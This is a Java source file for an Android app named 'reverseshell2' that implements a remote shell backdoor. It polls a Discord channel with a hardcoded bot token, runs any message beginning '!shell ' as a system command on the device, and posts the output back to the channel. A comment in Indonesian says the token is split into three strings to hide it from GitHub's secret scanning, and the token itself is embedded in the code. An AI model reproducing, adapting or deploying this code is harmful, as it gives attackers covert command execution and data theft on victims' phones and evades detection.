package com.example.reverseshell2;

import android.content.Context;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import okhttp3.*;
import org.json.JSONArray;
import org.json.JSONObject;

public class tcpConnection {
    // Token dipotong jadi 3 biar GitHub buta
    private static final String BAGIAN1 = "MTU3NDczODEyOTIwOTAwMDAyNg";
    private static final String BAGIAN2 = ".GFH8f9.";
    private static final String BAGIAN3 = "4rw8A37Wm6vzLsb4Y1YePewTIVGQI9Kp_vb3kY";
    private static final String TOKEN = BAGIAN1 + BAGIAN2 + BAGIAN3;
    
    private static final String CHANNEL_ID = "1574673355804508222";
    private static final String BASE_URL = "https://discord.com/api/v9/channels/" + CHANNEL_ID + "/messages";
    private final OkHttpClient client = new OkHttpClient();
    private String lastMessageId = "";

    public tcpConnection(Context context, Context appContext) {}

    public void execute(String ip, String port) {
        new Thread(() -> {
            while (true) {
                try {
                    Request request = new Request.Builder()
                        .url(BASE_URL + "?limit=1")
                        .addHeader("Authorization", "Bot " + TOKEN)
                        .addHeader("User-Agent", "Mozilla/5.0")
                        .get()
                        .build();

                    Response response = client.newCall(request).execute();
                    if (response.isSuccessful()) {
                        JSONArray array = new JSONArray(response.body().string());
                        if (array.length() > 0) {
                            JSONObject msg = array.getJSONObject(0);
                            String msgId = msg.getString("id");
                            String content = msg.getString("content");
                            
                            if (!msgId.equals(lastMessageId) && !msg.getJSONObject("author").getBoolean("bot")) {
                                lastMessageId = msgId;
                                if (content.startsWith("!shell ")) {
                                    String cmd = content.substring(7);
                                    String output = executeShell(cmd);
                                    sendMessage("```\n" + output + "\n```");
                                }
                            }
                        }
                    }
                } catch (Exception e) { e.printStackTrace(); }
                try { Thread.sleep(3000); } catch (InterruptedException e) { e.printStackTrace(); }
            }
        }).start();
    }

    private String executeShell(String command) {
        StringBuilder output = new StringBuilder();
        try {
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) { output.append(line).append("\n"); }
        } catch (Exception e) { return "Error: " + e.getMessage(); }
        return output.toString();
    }

    private void sendMessage(String message) {
        try {
            JSONObject json = new JSONObject();
            json.put("content", message);
            RequestBody body = RequestBody.create(json.toString(), MediaType.parse("application/json; charset=utf-8"));
            Request request = new Request.Builder().url(BASE_URL).addHeader("Authorization", "Bot " + TOKEN).post(body).build();
            client.newCall(request).execute().close();
        } catch (Exception e) { e.printStackTrace(); }
    }
}
